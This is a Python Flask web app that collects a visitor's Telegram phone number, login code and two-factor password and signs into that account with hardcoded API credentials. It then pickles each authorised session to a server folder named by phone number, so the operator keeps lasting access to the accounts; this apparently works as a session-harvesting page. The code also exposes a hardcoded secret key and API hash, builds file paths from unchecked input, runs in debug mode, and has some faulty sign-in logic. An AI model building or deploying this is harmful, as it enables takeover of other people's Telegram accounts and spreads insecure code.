from flask import Flask, render_template, request, redirect, url_for, session
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError
import os
import pickle
import asyncio

app = Flask(__name__)
app.secret_key = '45523c1d78b7b0abd2ae33641a18eb5e829a3c52dfaffa0ff60fc61688ed3e66'  # Replace with a strong secret key

# Telegram API credentials (replace with your own)
api_id = '23315467'
api_hash = '044b3a231d29d6fea07023fa2d682947'

# Directory to save the Telegram client session
SESSION_FOLDER = 'sessions'
if not os.path.exists(SESSION_FOLDER):
    os.makedirs(SESSION_FOLDER)

# Function to ensure an event loop exists in the current thread
def ensure_event_loop():
    try:
        loop = asyncio.get_event_loop()
    except RuntimeError as e:
        if 'no current event loop' in str(e):
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
        else:
            raise e
    return loop

@app.route('/')
def index():
    if 'phone' in session:
        return f'Logged in with phone number {session["phone"]} <br> <a href="/logout">Logout</a>'
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        phone_number = request.form['phone']  # Get the phone number from the form
        
        # Ensure the event loop is available
        loop = ensure_event_loop()

        # Initialize Telegram client
        client = TelegramClient(f'{SESSION_FOLDER}/{phone_number}', api_id, api_hash)
        
        with client:
            loop.run_until_complete(client.connect())

            if not loop.run_until_complete(client.is_user_authorized()):
                try:
                    loop.run_until_complete(client.send_code_request(phone_number))
                except PhoneCodeInvalidError:
                    return "Invalid phone number. Please try again."
                
                session['phone'] = phone_number
                session['client'] = client.session.save()
                return redirect(url_for('verify'))

    return render_template('login.html')

@app.route('/verify', methods=['GET', 'POST'])
def verify():
    if 'phone' not in session:
        return redirect(url_for('login'))
    
    phone_number = session['phone']
    client_session = session['client']
    
    # Ensure the event loop is available
    loop = ensure_event_loop()

    # Initialize the client with the saved session
    client = TelegramClient(f'{SESSION_FOLDER}/{phone_number}', api_id, api_hash)
    client.session.load(client_session)

    with client:
        loop.run_until_complete(client.connect())

        if request.method == 'POST':
            code = request.form['code']  # Get the verification code from the form

            try:
                loop.run_until_complete(client.sign_in(phone_number, code))

                if not loop.run_until_complete(client.is_user_authorized()):
                    # If 2FA is enabled, redirect to 2FA form
                    return redirect(url_for('two_factor_auth'))

                # Save Telegram client session
                session_file = os.path.join(SESSION_FOLDER, f'{phone_number}_session.pkl')
                with open(session_file, 'wb') as f:
                    pickle.dump(client.session, f)

                return redirect(url_for('index'))
            except PhoneCodeInvalidError:
                return 'Invalid code. Please try again.'

    return render_template('verify.html')

@app.route('/two_factor_auth', methods=['GET', 'POST'])
def two_factor_auth():
    if 'phone' not in session:
        return redirect(url_for('login'))

    phone_number = session['phone']
    client_session = session['client']
    
    # Ensure the event loop is available
    loop = ensure_event_loop()

    # Initialize the client with the saved session
    client = TelegramClient(f'{SESSION_FOLDER}/{phone_number}', api_id, api_hash)
    client.session.load(client_session)

    with client:
        loop.run_until_complete(client.connect())

        if request.method == 'POST':
            password = request.form['password']  # Get the 2FA password from the form

            try:
                loop.run_until_complete(client.sign_in(password=password))

                # Save Telegram client session
                session_file = os.path.join(SESSION_FOLDER, f'{phone_number}_session.pkl')
                with open(session_file, 'wb') as f:
                    pickle.dump(client.session, f)

                return redirect(url_for('index'))
            except PasswordHashInvalidError:
                return 'Invalid password. Please try again.'

    return render_template('2fa.html')

@app.route('/logout')
def logout():
    session.pop('phone', None)
    session.pop('client', None)
    return redirect(url_for('login'))

if __name__ == '__main__':
    app.run(debug=True, port=7256)